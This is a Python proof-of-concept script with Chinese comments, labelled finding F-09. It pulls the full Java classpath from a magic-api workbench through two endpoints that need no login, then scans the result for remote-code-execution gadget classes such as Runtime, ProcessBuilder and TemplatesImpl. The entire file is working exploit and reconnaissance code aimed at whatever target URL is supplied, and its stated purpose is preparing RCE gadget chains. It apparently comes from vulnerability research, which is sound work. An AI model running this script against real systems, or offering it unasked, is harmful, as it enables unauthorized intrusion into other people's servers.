#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F-09: 类路径枚举 (无需认证, 鉴权后仍可达)
MagicWorkbenchController 的 /classes.txt 与 /classes 使用 @Valid(requireLogin=false),
即使配置了 magic-api.security.username/password 也能未授权获取完整 Java classpath,
为 RCE gadget 链构造提供侦察数据。
用法:
  python3 poc_f09_classpath_enum.py http://target:9999
"""
import json
import sys
import urllib.request

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:9999'
WEB = f'{BASE}/magic/web'


def get(url):
    return urllib.request.urlopen(url, timeout=10).read().decode('utf-8', errors='replace')


def post(url):
    req = urllib.request.Request(url, data=b'', headers={'Content-Type': 'application/json'})
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


print(f'[+] 探测 {WEB}/classes.txt')
txt = get(f'{WEB}/classes.txt')
lines = [l for l in txt.splitlines() if l.strip()]
print(f'[+] 类数量: {len(lines)}, 示例包: {lines[:3]}')

# 检测 RCE 相关 gadget 类
dangerous = ['ProcessBuilder', 'Runtime', 'ScriptEngine', 'GroovyClassLoader', 'URLClassLoader',
             'ObjectInputStream', 'JdbcRowSetImpl', 'InitialContext', 'TemplatesImpl']
found = [d for d in dangerous if any(d in l for l in lines)]
if found:
    print(f'[!] 发现 {len(found)} 个 RCE gadget 类: {found}')

print(f'\n[+] 探测 {WEB}/classes (详细方法签名)')
cls = post(f'{WEB}/classes')
classes = cls.get('data', {}).get('classes', {})
print(f'[+] 返回类数量: {len(classes)}')
# 显示 Runtime/ProcessBuilder 的方法
for name in ('java.lang.Runtime', 'java.lang.ProcessBuilder'):
    if name in classes:
        methods = [m.get('name') for m in classes[name].get('methods', [])]
        print(f'[!] {name}: 方法 {methods[:8]}')
